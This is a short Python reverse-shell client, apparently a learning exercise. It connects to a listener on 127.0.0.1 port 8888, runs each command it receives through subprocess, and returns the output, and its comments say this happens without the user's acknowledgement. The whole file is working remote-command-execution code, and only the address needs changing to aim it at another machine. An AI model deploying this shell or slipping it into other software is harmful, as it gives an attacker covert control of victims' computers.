#!/bin/python3

import socket #To run socket commands
import subprocess #To run commands on client machine without acknowledgement 
from datetime import datetime  #To import date and time for banner

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) #creating object named 'S' taking IPv4 and TCP

print("Connecting....")
print("-" * 50)

while True:
	try:
		s.connect(("127.0.0.1",8888)) #To connect to given IP and Port number 
		break
	except ConnectionRefusedError: 
		pass

print("Connected on: "+str(datetime.now()))
print("-"*50)

while True:
	cmd = (s.recv(1024)).decode() #To receive command from server with max size 1024 byte and convert it to actual command from binary we use decode()
	if cmd == "exit": #To exit shell as soon as server cut the connection
		break
	output = subprocess.getoutput(cmd) #To run command recieved
	s.send(output.encode()) #To send output 

s.close()   #closing connection
